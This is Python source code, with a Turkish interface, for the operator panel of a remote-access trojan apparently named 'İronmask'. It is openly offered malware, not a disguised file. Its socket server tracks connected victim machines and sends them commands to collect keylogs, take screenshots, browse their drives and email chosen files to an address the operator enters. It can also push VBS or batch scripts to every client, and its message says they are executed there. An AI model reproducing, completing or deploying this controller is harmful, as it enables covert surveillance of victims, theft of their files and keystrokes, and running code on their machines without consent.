import socket
import threading
import os
import time
from PyQt6.QtWidgets import (
    QApplication, QWidget, QPushButton, QLabel, QVBoxLayout,
    QListWidget, QFileDialog, QFrame, QMessageBox, QInputDialog, QTreeWidget, QTreeWidgetItem, QHBoxLayout, QHeaderView, QDialog
)
from PyQt6.QtGui import QIcon
from PyQt6.QtCore import Qt, QThread, pyqtSignal

# Sunucu Bilgileri
HOST = "127.0.0.1"
PORT = 65432
clients = {}
clients_lock = threading.Lock()
server_socket = None

class ServerThread(QThread):
    client_connected = pyqtSignal(str)
    client_disconnected = pyqtSignal(str)
    file_list_received = pyqtSignal(str, str)
    error_signal = pyqtSignal(str)

    def run(self):
        global server_socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen()

        while True:
            try:
                conn, addr = server_socket.accept()
                with clients_lock:
                    clients[f"{addr[0]}:{addr[1]}"] = conn
                self.client_connected.emit(f"{addr[0]}:{addr[1]}")
                threading.Thread(target=self.manage_client, args=(conn, addr), daemon=True).start()
            except Exception as e:
                break

    def manage_client(self, conn, addr):
        try:
            while True:
                data = conn.recv(1024).decode()
                if not data:
                    break
                if data.startswith("DOSYA_LISTESI"):
                    parts = data.split("\n", 1)
                    directory = parts[0].split(" ", 1)[1]
                    files = parts[1]
                    self.file_list_received.emit(directory, files)
                elif data.startswith("HATA"):
                    self.error_signal.emit(data.split(" ", 1)[1])
        except:
            pass
        finally:
            with clients_lock:
                clients.pop(f"{addr[0]}:{addr[1]}", None)
            self.client_disconnected.emit(f"{addr[0]}:{addr[1]}")
            conn.close()

class KeyloggerThread(QThread):
    log_received = pyqtSignal(str, str)
    error_signal = pyqtSignal(str)

    def __init__(self, client_addr):
        super().__init__()
        self.client_addr = client_addr

    def run(self):
        try:
            with clients_lock:
                if self.client_addr not in clients:
                    self.error_signal.emit("İstemci bağlantısı kayboldu!")
                    return
                clients[self.client_addr].sendall("GET_KEYLOG".encode())
                logs = clients[self.client_addr].recv(8192).decode()
            self.log_received.emit(self.client_addr, logs)
        except Exception as e:
            self.error_signal.emit(f"Hata: {e}")

class ScreenshotThread(QThread):
    error_signal = pyqtSignal(str)

    def __init__(self, client_addr, recipient_email):
        super().__init__()
        self.client_addr = client_addr
        self.recipient_email = recipient_email

    def run(self):
        try:
            with clients_lock:
                if self.client_addr not in clients:
                    self.error_signal.emit("İstemci bağlantısı kayboldu!")
                    return
                clients[self.client_addr].sendall(f"GET_SCREENSHOT {self.recipient_email}".encode())
        except Exception as e:
            self.error_signal.emit(f"Hata: {e}")

class EmailKeylogThread(QThread):
    error_signal = pyqtSignal(str)

    def __init__(self, client_addr, recipient_email):
        super().__init__()
        self.client_addr = client_addr
        self.recipient_email = recipient_email

    def run(self):
        try:
            with clients_lock:
                if self.client_addr not in clients:
                    self.error_signal.emit("İstemci bağlantısı kayboldu!")
                    return
                clients[self.client_addr].sendall(f"EMAIL_KEYLOG {self.recipient_email}".encode())
        except Exception as e:
            self.error_signal.emit(f"Hata: {e}")

class FileBrowseThread(QThread):
    file_list_received = pyqtSignal(str, str)
    error_signal = pyqtSignal(str)

    def __init__(self, client_addr, directory):
        super().__init__()
        self.client_addr = client_addr
        self.directory = directory

    def run(self):
        try:
            with clients_lock:
                if self.client_addr not in clients:
                    self.error_signal.emit("İstemci bağlantısı kayboldu!")
                    return
                clients[self.client_addr].sendall(f"BROWSE_DIR {self.directory}".encode())
        except Exception as e:
            self.error_signal.emit(f"Hata: {e}")

class SendFileThread(QThread):
    error_signal = pyqtSignal(str)
    success_signal = pyqtSignal()

    def __init__(self, client_addr, recipient_email, file_path):
        super().__init__()
        self.client_addr = client_addr
        self.recipient_email = recipient_email
        self.file_path = file_path

    def run(self):
        try:
            with clients_lock:
                if self.client_addr not in clients:
                    self.error_signal.emit("İstemci bağlantısı kayboldu!")
                    return
                clients[self.client_addr].sendall(f"SEND_FILE {self.recipient_email} \"{self.file_path}\"".encode())
            self.success_signal.emit()
        except Exception as e:
            self.error_signal.emit(f"Hata: {e}")

class FileOperationDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Dosya İşlemleri")
        self.setGeometry(50, 50, 300, 300)
        self.setStyleSheet("background-color: #2c3e50; color: white; font-size: 14px;")

        layout = QVBoxLayout()

        self.file_tree = QTreeWidget()
        self.file_tree.setHeaderLabels(["Dosya Adı"])
        self.file_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.file_tree.setStyleSheet("background-color: #34495e; border-radius: 8px; padding: 5px; font-size: 16px;")
        self.file_tree.itemDoubleClicked.connect(self.download_file)
        layout.addWidget(self.file_tree)

        self.setLayout(layout)

    def update_file_tree(self, directory, files):
        self.file_tree.clear()
        root_item = QTreeWidgetItem([directory])
        self.file_tree.addTopLevelItem(root_item)
        for file in files.split("\n"):
            file_item = QTreeWidgetItem([file])
            root_item.addChild(file_item)
        self.file_tree.expandAll()

    def download_file(self, item, column):
        selected_client = self.parent().client_list.currentItem()
        if not selected_client:
            QMessageBox.warning(self, "Uyarı", "Önce bir istemci seçmelisiniz!")
            return
        client_addr = selected_client.text()
        if client_addr in self.parent().client_directories:
            base_directory = self.parent().client_directories[client_addr]
            file_path = os.path.join(base_directory, item.text(0))
        else:
            QMessageBox.warning(self, "Hata", "Geçerli bir dizin bulunamadı!")
            return
        recipient_email, ok = QInputDialog.getText(self, "E-posta Adresi", "Dosyayı göndermek için e-posta adresini girin:")
        if ok and recipient_email:
            self.parent().send_file_thread = SendFileThread(client_addr, recipient_email, file_path)
            self.parent().send_file_thread.error_signal.connect(lambda msg: QMessageBox.warning(self, "Hata", msg))
            self.parent().send_file_thread.success_signal.connect(lambda: QMessageBox.information(self, "Bilgi", "Dosya başarıyla gönderildi!"))
            self.parent().send_file_thread.start()

class FileServerUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("İronmask")
        self.setGeometry(100, 100, 600, 600)
        self.setStyleSheet("background-color: #2c3e50; color: white; font-size: 14px;")
        self.setWindowIcon(QIcon("icon.png"))

        self.client_directories = {}  # Initialize client_directories attribute

        self.layout = QVBoxLayout()

        self.label = QLabel("Bağlı İstemciler (#byhaktanTHT)")
        self.label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.label.setStyleSheet("font-size: 20px; font-weight: bold; margin: 10px;")
        self.layout.addWidget(self.label)

        self.client_list = QListWidget()
        self.client_list.setStyleSheet("background-color: #34495e; border-radius: 8px; padding: 10px; font-size: 16px;")
        self.layout.addWidget(self.client_list)

        self.separator = QFrame()
        self.separator.setFrameShape(QFrame.Shape.HLine)
        self.separator.setStyleSheet("background-color: white; height: 1px; margin: 10px 0;")
        self.layout.addWidget(self.separator)

        button_layout = QVBoxLayout()

        self.upload_button = QPushButton("📂 𝗞𝗼𝗺𝘂𝘁 𝗗𝗼𝘀𝘆𝗮𝘀ı 𝗖𝗮𝗹ı𝘀𝘁ı𝐫")
        self.upload_button.setStyleSheet("background-color:  #000000; color: white; padding: 10px; border-radius: 8px; font-size: 14px;")
        self.upload_button.clicked.connect(self.select_and_send_file)
        button_layout.addWidget(self.upload_button)

        self.log_button = QPushButton("📜 𝐊𝐞𝐲𝐥𝐨𝐠𝐥𝐚𝐫ı 𝐀𝐥 𝐯𝐞 𝐆ö𝐧𝐝𝐞𝐫")
        self.log_button.setStyleSheet("background-color:  #000000; color: white; padding: 10px; border-radius: 8px; font-size: 14px;")
        self.log_button.clicked.connect(self.email_keylogs)
        button_layout.addWidget(self.log_button)

        self.screenshot_button = QPushButton("📸 𝐄𝐤𝐫𝐚𝐧 𝐆ö𝐫ü𝐧𝐭ü𝐬ü 𝐀𝐥 𝐯𝐞 𝐆ö𝐧𝐝𝐞𝐫")
        self.screenshot_button.setStyleSheet("background-color:  #000000; color: white; padding: 10px; border-radius: 8px; font-size: 14px;")
        self.screenshot_button.clicked.connect(self.get_screenshot)
        button_layout.addWidget(self.screenshot_button)

        self.browse_button = QPushButton("🔽 𝐃𝐨𝐬𝐲𝐚 İş𝐥𝐞𝐦𝐥𝐞𝐫𝐢")
        self.browse_button.setStyleSheet("background-color:  #000000; color: white; padding: 10px; border-radius: 8px; font-size: 14px;")
        self.browse_button.clicked.connect(self.open_file_operations)
        button_layout.addWidget(self.browse_button)
        
        self.layout.addLayout(button_layout)

        self.setLayout(self.layout)
        self.server_thread = ServerThread()
        self.server_thread.client_connected.connect(self.add_client)
        self.server_thread.client_disconnected.connect(self.remove_client)
        self.server_thread.file_list_received.connect(self.update_file_tree)
        self.server_thread.error_signal.connect(lambda msg: QMessageBox.warning(self, "Hata", msg))
        self.server_thread.start()

        self.file_operations_dialog = FileOperationDialog(self)

    def add_client(self, client_info):
        self.client_list.addItem(client_info)

    def remove_client(self, client_info):
        for i in range(self.client_list.count()):
            if self.client_list.item(i).text() == client_info:
                self.client_list.takeItem(i)
                break

    def select_and_send_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Dosya Seç", "", "VBS Files (*.vbs);;Batch Files (*.bat)")
        if file_path:
            with open(file_path, "r") as file:
                file_content = file.read()
            self.broadcast_file(file_content)
            QMessageBox.information(self, "Bilgi", "Dosya başarıyla gönderildi ve çalıştırıldı!")

    def broadcast_file(self, file_content):
        with clients_lock:
            for client in clients.values():
                try:
                    client.sendall(file_content.encode())
                except:
                    pass

    def get_screenshot(self):
        selected_client = self.client_list.currentItem()
        if not selected_client:
            QMessageBox.warning(self, "Uyarı", "Önce bir istemci seçmelisiniz!")
            return
        client_addr = selected_client.text()
        recipient_email, ok = QInputDialog.getText(self, "E-posta Adresi", "Ekran görüntüsünü göndermek için e-posta adresini girin:")
        if ok and recipient_email:
            self.screenshot_thread = ScreenshotThread(client_addr, recipient_email)
            self.screenshot_thread.error_signal.connect(lambda msg: QMessageBox.warning(self, "Hata", msg))
            self.screenshot_thread.start()
            QMessageBox.information(self, "Bilgi", "Ekran görüntüsü başarıyla alındı ve gönderildi!")

    def email_keylogs(self):
        selected_client = self.client_list.currentItem()
        if not selected_client:
            QMessageBox.warning(self, "Uyarı", "Önce bir istemci seçmelisiniz!")
            return
        client_addr = selected_client.text()
        recipient_email, ok = QInputDialog.getText(self, "E-posta Adresi", "Keylogları göndermek için e-posta adresini girin:")
        if ok and recipient_email:
            self.email_keylog_thread = EmailKeylogThread(client_addr, recipient_email)
            self.email_keylog_thread.error_signal.connect(lambda msg: QMessageBox.warning(self, "Hata", msg))
            self.email_keylog_thread.start()
            QMessageBox.information(self, "Bilgi", "Keyloglar başarıyla alındı ve gönderildi!")

    def open_file_operations(self):
        selected_client = self.client_list.currentItem()
        if not selected_client:
            QMessageBox.warning(self, "Uyarı", "Önce bir istemci seçmelisiniz!")
            return
        client_addr = selected_client.text()
        directory, ok = QInputDialog.getText(self, "Dizin Girin", "Gezinmek istediğiniz dizini girin:", text="C:\\")
        if ok and directory:
            self.client_directories[client_addr] = directory  # Store the last browsed directory
            self.file_browse_thread = FileBrowseThread(client_addr, directory)
            self.file_browse_thread.file_list_received.connect(self.file_operations_dialog.update_file_tree)
            self.file_browse_thread.error_signal.connect(lambda msg: QMessageBox.warning(self, "Hata", msg))
            self.file_browse_thread.start()
            self.file_operations_dialog.show()

    def update_file_tree(self, directory, files):
        if self.file_operations_dialog.isVisible():
            self.file_operations_dialog.update_file_tree(directory, files)

if __name__ == "__main__":
    app = QApplication([])
    window = FileServerUI()
    window.show()
    app.exec()